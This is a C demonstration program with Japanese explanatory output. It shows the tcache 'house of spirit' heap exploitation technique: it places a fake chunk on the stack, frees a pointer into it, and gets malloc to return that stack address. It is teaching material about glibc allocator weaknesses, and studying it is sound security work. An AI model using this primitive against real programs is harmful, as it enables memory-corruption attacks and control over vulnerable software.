#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	printf("このファイルは、tcache に対する house of spirit 攻撃を示します。\n");
	printf("元の house of spirit と同じような仕組みで動作しますが、解放される偽のチャンクの後ろに偽のチャンクを作る必要はありません。\n");
	printf("これは malloc.c の関数 _int_free で確認できます。tcache_put は、次のチャンクのサイズと prev_inuse が妥当かどうかを確認せずに呼び出されます。\n");
	printf("(文字列 \"invalid next size\" と \"double free or corruption\" を検索してください)\n\n");

	printf("それでは、例を始めましょう。\n\n");


	printf("malloc() を一度呼び出して、メモリをセットアップさせます。\n");
	malloc(1);

	printf("1 つのポインタを上書きして、偽のチャンクの領域を指すようにする場面を想像してみましょう。\n");
	unsigned long long *a; //上書きされるポインタ
	unsigned long long fake_chunks[10] __attribute__((aligned(0x10))); //偽のチャンクの領域

	printf("この領域には偽のチャンクが 1 つ含まれています。そのサイズフィールドは %p に置かれています\n", &fake_chunks[1]);

	printf("このチャンクのサイズは tcache の範囲に収まっている必要があります(x64 では chunk.size <= 0x410、malloc の引数 <= 0x408)。PREV_INUSE(最下位ビット)は tcache のチャンクに対する free では無視されますが、IS_MMAPPED(下位から 2 番目のビット)と NON_MAIN_ARENA(下位から 3 番目のビット)は問題を引き起こします。\n");
	printf("... これは、次の malloc 要求のサイズを、malloc 実装が内部で使うサイズに丸めたものでなければならない点に注意してください。例えば x64 では、0x30 から 0x38 はすべて 0x40 に丸められるため、最後の malloc の引数として使えます。\n");
	fake_chunks[1] = 0x40; // これがサイズです


	printf("ここで、ポインタを、偽の最初のチャンクの内側にある偽のリージョンのアドレス %p で上書きします。\n", &fake_chunks[1]);
	printf("... このチャンクに対応する*リージョン*のメモリアドレスは、16 バイトにアライン(alignment)されている必要がある点に注意してください。\n");

	a = &fake_chunks[2];

	printf("上書きしたポインタを解放します。\n");
	free(a);

	printf("これで、次の malloc は %p にある偽のチャンクのリージョンを返し、それは %p になります。\n", &fake_chunks[1], &fake_chunks[2]);
	void *b = malloc(0x30);
	printf("malloc(0x30): %p\n", b);

	assert((long)b == (long)&fake_chunks[2]);
}
